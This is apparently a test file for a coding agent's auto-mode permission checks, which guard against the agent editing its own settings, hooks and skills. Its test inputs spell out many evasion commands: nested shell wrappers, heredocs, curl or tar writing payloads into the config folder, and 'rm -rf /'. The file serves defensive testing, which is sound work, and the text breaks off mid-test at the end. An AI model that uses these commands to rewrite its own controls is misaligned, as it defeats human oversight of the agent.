/**
 * @license
 * Copyright 2025 Qwen Team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  SAFE_TOOL_ALLOWLIST,
  applyAutoModeDecision,
  decorateAutoModeFallbackConfirmation,
  decorateClassifierUnavailableConfirmation,
  evaluateAutoMode,
  formatClassifierBlockMessage,
  formatClassifierUnavailableFallbackMessage,
  getAutoModeActionFingerprint,
  getAutoModePermissionDeniedReason,
  isAutoModeProtectedWritePath,
  isInSafeToolAllowlist,
  prepareAutoModeFallback,
  shouldFirePermissionDeniedForAutoMode,
  passesAcceptEditsFastPath,
  shouldClassifyAllShellForAutoMode,
  shouldForceAutoModeReviewForAllow,
  shouldRunAutoModeForCall,
} from './autoMode.js';
import { clearSessionCommits } from './destructive-commands.js';
import { ApprovalMode } from '../config/config.js';
import { ToolNames } from '../tools/tool-names.js';
import type { Config } from '../config/config.js';
import type { PermissionCheckContext } from './types.js';
import { setMemoryFilename } from '../utils/memory-constants.js';
import { userText } from '../test-utils/model-fixtures.js';

//Mock classifier to ensure in workspace protected writes still reach it
vi.mock('./classifier.js', () => ({
  classifyAction: vi.fn(async () => ({
    shouldBlock: false,
    reason: 'ok',
    stage: 'fast',
    durationMs: 1,
  })),
}));

// ─── SAFE_TOOL_ALLOWLIST contents (frozen) ───────────────────────────────

describe('SAFE_TOOL_ALLOWLIST', () => {
  it('includes the canonical read-only / metadata tools', () => {
    const expected = [
      ToolNames.READ_FILE,
      ToolNames.ZOOM_IMAGE,
      ToolNames.GREP,
      ToolNames.GLOB,
      ToolNames.LS,
      ToolNames.LSP,
      ToolNames.TOOL_SEARCH,
      ToolNames.TODO_WRITE,
      ToolNames.STRUCTURED_OUTPUT,
      ToolNames.ASK_USER_QUESTION,
      ToolNames.EXIT_PLAN_MODE,
      ToolNames.CRON_LIST,
      ToolNames.TASK_STOP,
    ];
    for (const tool of expected) {
      expect(SAFE_TOOL_ALLOWLIST.has(tool)).toBe(true);
    }
  });

  it('does NOT include destructive or side-effectful tools', () => {
    const forbidden = [
      ToolNames.EDIT,
      ToolNames.WRITE_FILE,
      ToolNames.SHELL,
      ToolNames.WEB_FETCH,
      ToolNames.AGENT,
      ToolNames.SKILL,
      ToolNames.MONITOR,
      ToolNames.CRON_CREATE,
      ToolNames.CRON_DELETE,
      ToolNames.LOOP_WAKEUP,
      // The bridge inherits the deferred target's safety classification and
      // must never bypass it as a safe wrapper.
      ToolNames.TOOL_CALL,
      // `send_message` injects arbitrary text into another running agent as a
      // new instruction; the classifier must see destination + body to detect
      // inter-agent steering toward destructive actions.
      ToolNames.SEND_MESSAGE,
    ];
    for (const tool of forbidden) {
      expect(SAFE_TOOL_ALLOWLIST.has(tool)).toBe(false);
    }
  });

  it('rejects MCP-style tool names', () => {
    expect(SAFE_TOOL_ALLOWLIST.has('mcp__server__some_tool')).toBe(false);
    expect(SAFE_TOOL_ALLOWLIST.has('mcp__*')).toBe(false);
  });

  it('contents are frozen (snapshot guard)', () => {
    expect([...SAFE_TOOL_ALLOWLIST].sort()).toMatchInlineSnapshot(`
      [
        "ask_user_question",
        "cron_list",
        "enter_plan_mode",
        "exit_plan_mode",
        "glob",
        "grep_search",
        "list_directory",
        "lsp",
        "read_file",
        "structured_output",
        "task_stop",
        "todo_write",
        "tool_search",
        "zoom_image",
      ]
    `);
  });
});

// ─── isInSafeToolAllowlist ────────────────────────────────────────────────

describe('isInSafeToolAllowlist', () => {
  it('returns true for an allowlisted tool', () => {
    expect(isInSafeToolAllowlist(ToolNames.READ_FILE)).toBe(true);
  });

  it('returns false for a non-allowlisted tool', () => {
    expect(isInSafeToolAllowlist(ToolNames.SHELL)).toBe(false);
  });

  it('returns false for an unknown tool name', () => {
    expect(isInSafeToolAllowlist('totally-made-up-tool')).toBe(false);
  });
});

// ─── passesAcceptEditsFastPath ────────────────────────────────────────────

/** A stub Config whose WorkspaceContext treats `workspaceRoots` as inside. */
function makeConfig(workspaceRoots: string[]): Config {
  return {
    getWorkspaceContext: () => ({
      // Test fixture: roots and paths in this file use POSIX-style separators
      // regardless of OS, so hard-code '/' (not path.sep) for the prefix check.
      isPathWithinWorkspace: (p: string) =>
        workspaceRoots.some((root) => p === root || p.startsWith(root + '/')),
    }),
  } as unknown as Config;
}

function ctx(over: Partial<PermissionCheckContext>): PermissionCheckContext {
  return {
    toolName: ToolNames.EDIT,
    ...over,
  };
}

/** Runs `fn` in a fresh temp dir (removed afterwards). */
function inTmpDir(prefix: string, fn: (tmpRoot: string) => void) {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  try {
    fn(tmpRoot);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
}

/** Runs `fn`, then restores QWEN_HOME (deleting it if it was unset). */
function restoringQwenHome(fn: () => void) {
  const originalQwenHome = process.env['QWEN_HOME'];
  try {
    fn();
  } finally {
    if (originalQwenHome === undefined) {
      delete process.env['QWEN_HOME'];
    } else {
      process.env['QWEN_HOME'] = originalQwenHome;
    }
  }
}

describe('isAutoModeProtectedWritePath', () => {
  const expectProtected = (paths: string[], expected = true) => {
    for (const filePath of paths) {
      expect(isAutoModeProtectedWritePath(filePath)).toBe(expected);
    }
  };

  it('matches Qwen self-modification files and directories', () => {
    expectProtected([
      '/repo/.qwen/settings.json',
      '/repo/.qwen/settings.local.json',
      '/repo/QWEN.md',
      '/repo/AGENTS.md',
      '/repo/.qwen/commands/review.md',
      '/repo/.qwen/agents/reviewer.md',
      '/repo/.qwen/skills/skill-a/SKILL.md',
      '/repo/.qwen/hooks/pre-tool-use.json',
      '/repo/.qwen/fork-profiles/ro-research.md',
      '/repo/.qwen/QWEN.local.md',
      '/repo/.qwen/rules/backend.md',
      '/repo/.mcp.json',
      '/repo/.git',
    ]);
  });

  it('does not treat ordinary source files or worktree files as protected', () => {
    expectProtected(
      [
        '/repo/src/index.ts',
        '/repo/.qwen/PROJECT_SUMMARY.md',
        '/repo/.qwen/worktrees/feature/src/index.ts',
      ],
      false,
    );
  });

  it('still protects config surfaces inside managed worktrees', () => {
    expectProtected([
      '/repo/.qwen/worktrees/feature/.qwen/settings.json',
      '/repo/.qwen/worktrees/feature/AGENTS.md',
      '/repo/.qwen/worktrees/feature/.qwen/QWEN.local.md',
      '/repo/.qwen/worktrees/feature/.qwen/rules/backend.md',
      '/repo/.qwen/worktrees/feature/.mcp.json',
    ]);
  });

  it('matches protected paths case-insensitively', () => {
    expectProtected([
      '/repo/qwen.md',
      '/repo/agents.md',
      '/repo/.QWEN/SETTINGS.JSON',
      '/repo/.QWEN/QWEN.LOCAL.MD',
      '/repo/.QWEN/RULES/backend.md',
      '/repo/.MCP.JSON',
      '/repo/GNUmakefile',
      '/repo/Taskfile.yaml',
      '/repo/.Github/workflows/ci.yml',
    ]);
  });

  it('matches configured context filenames', () => {
    setMemoryFilename(['CUSTOM_AGENTS.md', 'docs/TEAM_CONTEXT.md']);
    try {
      expectProtected([
        '/repo/CUSTOM_AGENTS.md',
        '/repo/docs/TEAM_CONTEXT.md',
        '/repo/.qwen/worktrees/feature/CUSTOM_AGENTS.md',
      ]);
    } finally {
      setMemoryFilename(['QWEN.md', 'AGENTS.md']);
    }
  });

  it('matches self-modification surfaces in custom QWEN_HOME', () => {
    restoringQwenHome(() => {
      process.env['QWEN_HOME'] = '/tmp/custom-qwen-home';
      expectProtected([
        '/tmp/custom-qwen-home/settings.json',
        '/tmp/custom-qwen-home/settings.local.json',
        '/tmp/custom-qwen-home/QWEN.local.md',
        '/tmp/custom-qwen-home/commands/review.md',
        '/tmp/custom-qwen-home/agents/reviewer.md',
        '/tmp/custom-qwen-home/skills/review/SKILL.md',
        '/tmp/custom-qwen-home/hooks/pre-tool-use.json',
        '/tmp/custom-qwen-home/fork-profiles/ro-research.md',
        '/tmp/custom-qwen-home/rules/backend.md',
        '/tmp/custom-qwen-home/.mcp.json',
      ]);
    });
  });

  it('matches real paths under a symlinked custom QWEN_HOME', () => {
    restoringQwenHome(() =>
      inTmpDir('qwen-home-', (tmpRoot) => {
        const realHome = path.join(tmpRoot, 'real-home');
        const linkedHome = path.join(tmpRoot, 'linked-home');
        fs.mkdirSync(realHome, { recursive: true });
        fs.symlinkSync(realHome, linkedHome);
        process.env['QWEN_HOME'] = linkedHome;

        const settingsPath = path.join(realHome, 'settings.json');
        fs.writeFileSync(settingsPath, '{}');

        expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
      }),
    );
  });

  it('re-resolves write paths after symlinks are created', () => {
    inTmpDir('qwen-write-path-', (tmpRoot) => {
      const protectedDir = path.join(tmpRoot, '.qwen');
      const settingsPath = path.join(protectedDir, 'settings.json');
      const linkPath = path.join(tmpRoot, 'scratch');
      fs.mkdirSync(protectedDir, { recursive: true });
      fs.writeFileSync(settingsPath, '{}');

      expect(isAutoModeProtectedWritePath(linkPath)).toBe(false);

      fs.symlinkSync(settingsPath, linkPath);

      expect(isAutoModeProtectedWritePath(linkPath)).toBe(true);
    });
  });

  it('caches normalized QWEN_HOME prefixes per configured home', () => {
    restoringQwenHome(() =>
      inTmpDir('qwen-home-cache-', (tmpRoot) => {
        const realpathSpy = vi.spyOn(fs.realpathSync, 'native');
        try {
          const settingsPath = path.join(tmpRoot, 'settings.json');
          fs.writeFileSync(settingsPath, '{}');
          process.env['QWEN_HOME'] = tmpRoot;

          expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
          expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
          expect(
            realpathSpy.mock.calls.filter(([arg]) => arg === tmpRoot),
          ).toHaveLength(1);
        } finally {
          realpathSpy.mockRestore();
        }
      }),
    );
  });
});

describe('passesAcceptEditsFastPath', () => {
  const cwd = '/Users/test/project';
  const config = makeConfig([cwd]);
  const fastPath = (
    toolName: string,
    filePath: string | undefined,
    cfg = config,
  ) => passesAcceptEditsFastPath(ctx({ toolName, filePath }), cfg);

  it('allows EDIT targeting a path inside cwd', () => {
    expect(fastPath(ToolNames.EDIT, `${cwd}/src/foo.ts`)).toBe(true);
  });

  it('allows WRITE_FILE targeting a path inside cwd', () => {
    expect(fastPath(ToolNames.WRITE_FILE, `${cwd}/x.ts`)).toBe(true);
  });

  it('rejects Qwen self-modification paths even inside cwd', () => {
    const protectedPaths = [
      `${cwd}/.qwen/settings.json`,
      `${cwd}/.qwen/settings.local.json`,
      `${cwd}/QWEN.md`,
      `${cwd}/AGENTS.md`,
      `${cwd}/.qwen/commands/review.md`,
      `${cwd}/.qwen/agents/reviewer.md`,
      `${cwd}/.qwen/skills/review/SKILL.md`,
      `${cwd}/.qwen/hooks/pre-tool-use.json`,
      `${cwd}/.qwen/fork-profiles/ro-research.md`,
      `${cwd}/.qwen/QWEN.local.md`,
      `${cwd}/.qwen/rules/backend.md`,
      `${cwd}/.mcp.json`,
    ];

    for (const toolName of [ToolNames.EDIT, ToolNames.WRITE_FILE]) {
      for (const filePath of protectedPaths) {
        expect(fastPath(toolName, filePath)).toBe(false);
      }
    }
  });

  it('allows ordinary files under .qwen/worktrees but rejects nested config surfaces', () => {
    const worktree = `${cwd}/.qwen/worktrees/feature`;
    expect(fastPath(ToolNames.WRITE_FILE, `${worktree}/src/index.ts`)).toBe(
      true,
    );

    expect(
      fastPath(ToolNames.WRITE_FILE, `${worktree}/.qwen/settings.json`),
    ).toBe(false);
  });

  it('rejects symlinks that resolve to protected self-modification paths', () => {
    inTmpDir('qwen-auto-mode-', (tmpRoot) => {
      const qwenDir = path.join(tmpRoot, '.qwen');
      fs.mkdirSync(qwenDir, { recursive: true });
      const target = path.join(qwenDir, 'settings.json');
      fs.writeFileSync(target, '{}');

      const link = path.join(tmpRoot, 'settings-link.json');
      fs.symlinkSync(target, link);

      const cfg = {
        getWorkspaceContext: () => ({
          isPathWithinWorkspace: () => true,
        }),
      } as unknown as Config;

      expect(fastPath(ToolNames.WRITE_FILE, link, cfg)).toBe(false);
    });
  });

  it('rejects EDIT targeting a path outside the workspace', () => {
    expect(fastPath(ToolNames.EDIT, '/Users/test/other-project/x.ts')).toBe(
      false,
    );
  });

  it('rejects WRITE_FILE targeting /etc/hosts', () => {
    expect(fastPath(ToolNames.WRITE_FILE, '/etc/hosts')).toBe(false);
  });

  it('rejects when filePath is missing', () => {
    expect(fastPath(ToolNames.EDIT, undefined)).toBe(false);
  });

  it('rejects non-edit tools (SHELL)', () => {
    expect(
      passesAcceptEditsFastPath(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'rm -rf node_modules',
          filePath: `${cwd}/x.ts`,
        }),
        config,
      ),
    ).toBe(false);
  });

  it('rejects allowlisted read-only tools', () => {
    expect(fastPath(ToolNames.READ_FILE, `${cwd}/x.ts`)).toBe(false);
  });

  it('respects additional workspace roots', () => {
    const cfg = makeConfig([cwd, '/Users/test/extra-dir']);
    expect(
      fastPath(ToolNames.EDIT, '/Users/test/extra-dir/sub/file.ts', cfg),
    ).toBe(true);
  });

  it('does not match prefix-collision paths (e.g. /project vs /project-other)', () => {
    expect(fastPath(ToolNames.EDIT, '/Users/test/project-other/x.ts')).toBe(
      false,
    );
  });

  it('calls workspace context isPathWithinWorkspace for the actual path check', () => {
    const fn = vi.fn(() => true);
    const cfg = {
      getWorkspaceContext: () => ({ isPathWithinWorkspace: fn }),
    } as unknown as Config;
    fastPath(ToolNames.EDIT, '/some/path/x.ts', cfg);
    expect(fn).toHaveBeenCalledWith('/some/path/x.ts');
  });
});

describe('shouldForceAutoModeReviewForAllow', () => {
  /** `command` run through `toolName` (default Shell) from /repo. */
  const forcesReview = (command: string, toolName: string = ToolNames.SHELL) =>
    shouldForceAutoModeReviewForAllow(ctx({ toolName, command, cwd: '/repo' }));
  const forcesReviewOf = (toolName: string, filePath: string) =>
    shouldForceAutoModeReviewForAllow(ctx({ toolName, filePath }));
  const heredoc = (body: string) =>
    ["bash <<'SCRIPT'", body, 'SCRIPT'].join('\n');

  it('returns true for Edit/Write targeting protected self-modification paths', () => {
    expect(
      forcesReviewOf(ToolNames.EDIT, '/Users/test/.qwen/settings.json'),
    ).toBe(true);

    expect(
      forcesReviewOf(ToolNames.WRITE_FILE, '/repo/.qwen/QWEN.local.md'),
    ).toBe(true);

    expect(
      forcesReviewOf(
        ToolNames.NOTEBOOK_EDIT,
        '/repo/.qwen/skills/review/demo.ipynb',
      ),
    ).toBe(true);
  });

  it('returns true for shell-like commands writing protected paths', () => {
    expect(forcesReview('echo "{}" > .qwen/settings.json')).toBe(true);

    expect(
      forcesReview(
        'bash -lc \'echo "{}" > .qwen/settings.json\'',
        ToolNames.MONITOR,
      ),
    ).toBe(true);
  });

  it('returns true for nested wrappers writing protected paths after `cd`', () => {
    // Regression guard: without `extractShellOperationsAcrossCommand` doing
    // cross-segment cd tracking AND recursive wrapper unwrapping, this payload
    // would slip past AUTO force-review, and a `permissions.allow: ["Bash(*)"]`
    // rule plus this command would silently overwrite settings.json.
    expect(forcesReview("cd .qwen && bash -lc 'echo {} > settings.json'")).toBe(
      true,
    );
  });

  it('returns true for relative writes after an unresolved dynamic `cd`', () => {
    // If cwd is dynamic, the apparent resolved path is only a guess. Route
    // back to the classifier so an allow rule cannot hide writes like
    // `cd "$QWEN_HOME" && echo > settings.json`.
    expect(forcesReview('cd "$QWEN_HOME" && echo "{}" > settings.json')).toBe(
      true,
    );
  });

  it('returns false for ordinary writes after `cd` into project subdirs', () => {
    // Counter-case for the cd-tracking check: cd-into-src + write a generated
    // file must NOT force review, or every workspace-internal compound command
    // would round-trip through the classifier and dilute its signal.
    expect(forcesReview("cd src && bash -lc 'echo ok > generated.txt'")).toBe(
      false,
    );
  });

  it('returns true for shell-like commands writing protected paths after cd', () => {
    expect(forcesReview('cd .qwen && echo "{}" > settings.json')).toBe(true);

    expect(
      forcesReview(
        'bash -lc \'cd .qwen && echo "{}" > settings.json\'',
        ToolNames.MONITOR,
      ),
    ).toBe(true);
  });

  it('returns true for protected writes in sibling segments after shell wrappers', () => {
    expect(
      forcesReview("bash -lc 'echo ok' && echo hi > .qwen/settings.json"),
    ).toBe(true);
  });

  it('returns true for newline-separated protected shell writes after cd', () => {
    expect(forcesReview('cd .qwen\ncp /tmp/malicious settings.json')).toBe(
      true,
    );
  });

  it('returns true for grouped and metacharacter-suffixed protected writes', () => {
    expect(forcesReview("{ cd .qwen && echo '{}' > settings.json; }")).toBe(
      true,
    );

    expect(forcesReview('(echo > .qwen/settings.json)')).toBe(true);
  });

  it('returns true for protected writes embedded in shell heredoc bodies', () => {
    expect(forcesReview(heredoc("echo '{}' > .qwen/settings.json"))).toBe(true);
  });

  it('returns true for protected write commands embedded in heredoc bodies', () => {
    expect(forcesReview(heredoc('cp /tmp/payload .qwen/settings.json'))).toBe(
      true,
    );

    for (const body of [
      "tee .qwen/settings.json <<< '{}'",
      'dd if=/tmp/payload of=.qwen/settings.json',
      'sort -o .qwen/settings.json /dev/null',
      "node -e \"require('fs').writeFileSync('.qwen/settings.json', '{}')\"",
    ]) {
      expect(forcesReview(heredoc(body))).toBe(true);
    }
  });

  it('returns true for protected write commands with variable destinations', () => {
    expect(forcesReview('D=.qwen/settings.json; cp payload "$D"')).toBe(true);
  });

  it('does not force review for awk field references', () => {
    expect(forcesReview("awk '{print $1}' data.csv")).toBe(false);
  });

  it('returns true for awk in-place edits to protected paths', () => {
    for (const command of [
      'awk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
      'gawk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
    ]) {
      expect(forcesReview(command)).toBe(true);
    }
  });

  it('returns true for sort writing protected paths via output flags', () => {
    for (const command of [
      'sort -o .qwen/settings.json /dev/null',
      'sort --output=.qwen/settings.json /dev/null',
    ]) {
      expect(forcesReview(command)).toBe(true);
    }
  });

  it('returns true for protected heredoc redirects with repeated quote tokens', () => {
    expect(forcesReview(heredoc('echo "{}" > """.qwen/settings.json"""'))).toBe(
      true,
    );
  });

  it('returns true for protected clobber and fd redirects', () => {
    for (const command of [
      "echo '{}' >| .qwen/settings.json",
      "echo '{}' >& .qwen/settings.json",
    ]) {
      expect(forcesReview(command)).toBe(true);
    }
  });

  it('returns true for ANSI-C quoted protected redirect targets', () => {
    expect(forcesReview("echo '{}' > $'.qwen/settings.json'")).toBe(true);
  });

  it('returns true for bidirectional redirects to protected paths', () => {
    expect(forcesReview('cat <> .qwen/settings.json')).toBe(true);
  });

  it('returns true for target-directory writes to protected filenames', () => {
    expect(forcesReview('cp -t .qwen /tmp/settings.json')).toBe(true);
  });

  it('returns true for downloader output flags targeting protected paths', () => {
    for (const command of [
      'curl -o .qwen/settings.json https://example.com/payload',
      'curl -o.qwen/settings.json https://example.com/payload',
      'wget -O .qwen/settings.json https://example.com/payload',
      'wget -O.qwen/settings.json https://example.com/payload',
    ]) {
      expect(forcesReview(command)).toBe(true);
    }
  });

  it('returns true for archive extraction commands targeting protected dirs', () => {
    for (const command of [
      'tar xf payload.tar -C .qwen/skills',
      'tar xf payload.tar -C.qwen/skills',
      'tar xf payload.tar --directory=.qwen/skills',
      'unzip payload.zip -d .qwen/skills',
      'unzip payload.zip -d.qwen/skills',
      'cpio -i -D .qwen/skills',
      'cpio -i -D.qwen/skills',
    ]) {
      expect(forcesReview(command)).toBe(true);
    }
  });

  it('returns true for patch output flags targeting protected paths', () => {
    for (const command of [
      'patch --output=.qwen/settings.json -i fix.patch',
      'patch -o.qwen/settings.json -i fix.patch',
    ]) {
      expect(forcesReview(command)).toBe(true);
    }
  });

  it('returns true for find exec writes with placeholder operands', () => {
    expect(forcesReview('find . -exec cp {} .qwen/settings.json ;')).toBe(true);
  });

  it('returns true for find execdir writes with placeholder operands', () => {
    expect(forcesReview('find . -execdir cp {} .qwen/settings.json ;')).toBe(
      true,
    );
  });

  it('returns true for long in-place sed/perl writes to protected paths', () => {
    for (const command of [
      "sed --in-place 's/x/y/' .qwen/settings.json",
      "sed --in-place=.bak 's/x/y/' .qwen/settings.json",
      "perl --in-place -e 's/x/y/' .qwen/settings.json",
    ]) {
      expect(forcesReview(command)).toBe(true);
    }
  });

  it('returns false for read-only sed/perl commands', () => {
    for (const command of [
      "sed 's/a/b/' /tmp/file",
      "perl -e 'print $_' /tmp/file",
      "sed -n '1,10p' .qwen/settings.json",
    ]) {
      expect(forcesReview(command)).toBe(false);
    }
  });

  it('uses the provided cwd fallback when ctx.cwd is absent', () => {
    expect(
      shouldForceAutoModeReviewForAllow(
        ctx({
          toolName: ToolNames.SHELL,
          command: 'echo "{}" > .qwen/settings.json',
        }),
        '/repo',
      ),
    ).toBe(true);
  });

  it('returns false for ordinary edits and non-edit tools', () => {
    expect(forcesReviewOf(ToolNames.EDIT, '/repo/src/index.ts')).toBe(false);

    expect(
      forcesReviewOf(ToolNames.READ_FILE, '/repo/.qwen/settings.json'),
    ).toBe(false);

    expect(forcesReview('echo "ok" > src/output.txt')).toBe(false);

    expect(forcesReview('cd src && echo "ok" > output.txt')).toBe(false);
  });
});

// ─── evaluateAutoMode gating ─────────────────────────────────────────────

const PROJECT = '/Users/test/project';
const onFile = (toolName: string, filePath: string) => ({ toolName, filePath });

/** evaluateAutoMode for `ctx` in a workspace rooted at PROJECT: no ask rule,
 * no tool params, no history; `extra` overrides any of these. */
function evaluate(
  ctx: PermissionCheckContext,
  extra: Partial<Parameters<typeof evaluateAutoMode>[0]> = {},
) {
  return evaluateAutoMode({
    ctx,
    pmForcedAsk: false,
    toolParams: {},
    messages: [],
    config: makeConfig([PROJECT]),
    signal: new AbortController().signal,
    ...extra,
  });
}

const counters = (
  consecutiveBlock: number,
  consecutiveUnavailable: number,
  totalBlock: number,
  totalUnavailable: number,
) => ({
  consecutiveBlock,
  consecutiveUnavailable,
  totalBlock,
  totalUnavailable,
});

type ClassifierVerdict = Extract<
  Parameters<typeof applyAutoModeDecision>[0],
  { via: 'classifier' }
>;
/** A classifier verdict: a fast-stage policy block unless overridden. */
const verdict = (o: Partial<ClassifierVerdict> = {}): ClassifierVerdict => ({
  via: 'classifier',
  shouldBlock: true,
  reason: 'unsafe command',
  unavailable: false,
  stage: 'fast',
  durationMs: 10,
  ...o,
});

/** applyAutoModeDecision with a spy as the config's setAutoModeDenialState. */
function apply(
  decision: Parameters<typeof applyAutoModeDecision>[0],
  state: Parameters<typeof applyAutoModeDecision>[2],
  actionFingerprint?: string,
) {
  const setAutoModeDenialState = vi.fn();
  const config = { setAutoModeDenialState } as unknown as Config;
  const result = applyAutoModeDecision(
    decision,
    config,
    state,
    actionFingerprint,
  );
  return { result, setAutoModeDenialState };
}

describe('evaluateAutoMode — fast-path gating', () => {
  const cwd = PROJECT;

  it('fires L5.1 acceptEdits fast-path when pmForcedAsk=false', async () => {
    const decision = await evaluate(onFile(ToolNames.EDIT, `${cwd}/src/x.ts`));
    expect(decision.via).toBe('fast-path:accept-edits');
  });

  it('fires L5.2 allowlist fast-path when pmForcedAsk=false', async () => {
    const decision = await evaluate(
      onFile(ToolNames.READ_FILE, '/anywhere/x.ts'),
    );
    expect(decision.via).toBe('fast-path:allowlist');
  });

  it('routes to manual fallback (skipping classifier) when pmForcedAsk=true', async () => {
    // An explicit user ask rule must skip fast-paths AND classifier
    // (auto-mode.md: "ask rules force manual confirmation"); otherwise the
    // classifier could approve and silently override the user's intent.
    const decision = await evaluate(onFile(ToolNames.EDIT, `${cwd}/src/x.ts`), {
      pmForcedAsk: true,
    });
    expect(decision).toEqual({ via: 'fallback', reason: 'ask_rule' });
  });

  it('routes to fallback with the denialTracking reason when armed', async () => {
    // Regression guard: once denialTracking armed a fallback (3 consecutive
    // blocks / 2 consecutive unavailables) the scheduler passes the reason, so
    // the call drops to manual approval without another classifier request.
    // Only the classifier dispatch is suppressed (fast paths still fire);
    // SHELL hits neither fast-path, so without skipClassifierReason it would
    // dispatch the classifier.
    const decision = await evaluate(
      { toolName: ToolNames.SHELL, command: 'rm -rf /' },
      { skipClassifierReason: 'total_denial' },
    );
    expect(decision).toEqual({ via: 'fallback', reason: 'total_denial' });
  });

  // ─── New tests for external write fallback ───
  it('routes external EDIT to manual fallback before classifier', async () => {
    const decision = await evaluate(
      onFile(ToolNames.EDIT, '/Users/test/other-project/x.ts'),
    );
    expect(decision).toEqual({ via: 'fallback', reason: 'external_write' });
  });

  it('routes external WRITE_FILE to manual fallback before classifier', async () => {
    const decision = await evaluate(onFile(ToolNames.WRITE_FILE, '/etc/hosts'));
    expect(decision).toEqual({ via: 'fallback', reason: 'external_write' });
  });

  it('routes external NOTEBOOK_EDIT to manual fallback before classifier', async () => {
    const decision = await evaluate(
      onFile(ToolNames.NOTEBOOK_EDIT, '/users/test/other-project/nb.ipynb'),
    );
    expect(decision).toEqual({ via: 'fallback', reason: 'external_write' });
  });

  it.each([ToolNames.SHELL, ToolNames.MONITOR])(
    'routes %s with a directory outside the workspace to manual fallback before classifier',
    async (toolName) => {
      const decision = await evaluateAutoMode({
        ctx: {
          toolName,
          command: 'npm run build',
          cwd: '/Users/test/other-project',
        },
        pmForcedAsk: false,
        toolParams: {},
        messages: [],
        config: makeConfig([cwd]),
        signal: new AbortController().signal,
      });
      expect(decision).toEqual({
        via: 'fallback',
        reason: 'external_directory',
      });
    },
  );

  it('routes a shell directory inside the workspace to classifier', async () => {
    const decision = await evaluateAutoMode({
      ctx: {
        toolName: ToolNames.SHELL,
        command: 'npm run build',
        cwd: `${cwd}/packages/app`,
      },
      pmForcedAsk: false,
      toolParams: {},
      messages: [],
      config: makeConfig([cwd]),
      signal: new AbortController().signal,
    });
    expect(decision.via).toBe('classifier');
  });

  it('routes in-workspace protected writes to classifier', async () => {
    const decision = await evaluate(
      onFile(ToolNames.EDIT, `${cwd}/.qwen/settings.json`),
    );
    expect(decision.via).toBe('classifier');
  });
});

// ─── applyAutoModeDecision reason mapping ────────────────────────────────

describe('applyAutoModeDecision — blocked reason mapping', () => {
  const denialState = counters(0, 0, 0, 0);

  it('maps classifier policy blocks to classifier_blocked', () => {
    const { result, setAutoModeDenialState } = apply(verdict(), denialState);

    expect(result).toMatchObject({
      kind: 'blocked',
      reason: 'classifier_blocked',
    });
    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(1, 0, 1, 0));
  });

  it('routes the block that reaches the consecutive limit to manual approval', () => {
    const { result, setAutoModeDenialState } = apply(
      verdict(),
      counters(2, 0, 2, 0),
      'blocked-action',
    );

    expect(result).toMatchObject({
      kind: 'fallback',
      reason: 'consecutive_block',
    });
    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(3, 0, 3, 0));
  });

  it('routes the block that reaches the total limit to manual approval', () => {
    const { result, setAutoModeDenialState } = apply(
      verdict(),
      counters(0, 0, 19, 0),
      'blocked-action',
    );

    expect(result).toMatchObject({
      kind: 'fallback',
      reason: 'total_denial',
    });
    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(1, 0, 20, 0));
  });

  it('routes classifier infrastructure failures to manual approval', () => {
    const { result, setAutoModeDenialState } = apply(
      verdict({ reason: 'timeout', unavailable: true, stage: 'thinking' }),
      denialState,
    );

    expect(result).toMatchObject({
      kind: 'fallback',
      reason: 'classifier_unavailable',
      message: expect.stringContaining('Switching to Default Mode'),
    });
    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(0, 1, 0, 1));
  });

  it('allows classifier approvals and resets consecutive counters', () => {
    const { result, setAutoModeDenialState } = apply(
      verdict({ shouldBlock: false, reason: 'safe command' }),
      counters(1, 2, 3, 4),
    );

    expect(result).toEqual({ kind: 'approved' });
    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(0, 0, 3, 4));
  });

  it('passes through fallback reason without mutating denial state', () => {
    const { result, setAutoModeDenialState } = apply(
      { via: 'fallback', reason: 'consecutive_block' },
      denialState,
    );

    expect(result).toMatchObject({
      kind: 'fallback',
      reason: 'consecutive_block',
    });
    expect(setAutoModeDenialState).not.toHaveBeenCalled();
  });

  it('explains an outside-directory fallback in the approval prompt', () => {
    const setAutoModeDenialState = vi.fn();
    const result = applyAutoModeDecision(
      { via: 'fallback', reason: 'external_directory' },
      { setAutoModeDenialState } as unknown as Config,
      denialState,
    );

    expect(result).toEqual({
      kind: 'fallback',
      reason: 'external_directory',
      message:
        'Commands outside the workspace require manual approval in AUTO mode.',
    });
  });

  it('consumes a matching retry token when a threshold fallback takes precedence', () => {
    const actionFingerprint = 'same-action';
    const { result, setAutoModeDenialState } = apply(
      { via: 'fallback', reason: 'consecutive_block' },
      {
        ...denialState,
        consecutiveBlock: 3,
        pendingManualRetryFingerprint: actionFingerprint,
      },
      actionFingerprint,
    );

    expect(result).toMatchObject({
      kind: 'fallback',
      reason: 'consecutive_block',
    });
    expect(setAutoModeDenialState).toHaveBeenCalledWith({
      ...denialState,
      consecutiveBlock: 3,
    });
  });
});

describe('getAutoModeActionFingerprint', () => {
  it('matches canonical args only within the same working directory', () => {
    expect(getAutoModeActionFingerprint('shell', { b: 2, a: 1 }, '/repo')).toBe(
      getAutoModeActionFingerprint('shell', { a: 1, b: 2 }, '/repo'),
    );
    expect(getAutoModeActionFingerprint('shell', { a: 1 }, '/repo')).not.toBe(
      getAutoModeActionFingerprint('shell', { a: 1 }, '/other'),
    );
  });
});

// ─── formatClassifierBlockMessage ────────────────────────────────────────

describe('formatClassifierBlockMessage', () => {
  // Shared between coreToolScheduler.ts and acp-integration/session/
  // Session.ts. Drift between the two used to give CLI vs ACP users
  // different diagnostics for the same failure — guard it once.
  it('renders a policy-block message including the reason', () => {
    expect(
      formatClassifierBlockMessage(
        verdict({
          stage: 'thinking',
          durationMs: 100,
          reason: 'Irreversible filesystem destruction',
        }),
      ),
    ).toBe(
